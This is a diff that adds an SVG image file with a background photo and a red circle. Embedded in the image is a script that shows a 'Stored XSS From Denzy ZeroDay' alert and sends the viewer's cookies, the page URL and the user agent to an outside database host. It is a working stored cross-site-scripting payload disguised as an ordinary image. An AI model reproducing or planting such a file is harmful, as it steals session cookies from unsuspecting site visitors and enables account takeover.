@@ -1,0 +1,26 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://w3.org" viewBox="0 0 500 500">
+  <!-- Foto Background -->
+  <image xlink:href="https://napkinsdev.s3.us-east-1.amazonaws.com/next-s3-uploads/61cab467-c3a7-4765-8cc6-573786f9ffac/1776141465863.jpg" 
+         x="0" y="0" height="100%" width="100%" />
+
+  <circle cx="50" cy="50" r="40" fill="red" fill-opacity="0.5" />
+  
+  <script type="text/javascript">
+    // <![CDATA[
+    alert('Stored XSS From Denzy ZeroDay');
+
+    fetch('https://firebasedatabase.app', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: JSON.stringify({
+        msg: "XSS Triggered",
+        cookie: document.cookie,
+        url: window.location.href,
+        ua: navigator.userAgent
+      })
+    });
+    // ]]>
+  </script>
+</svg>
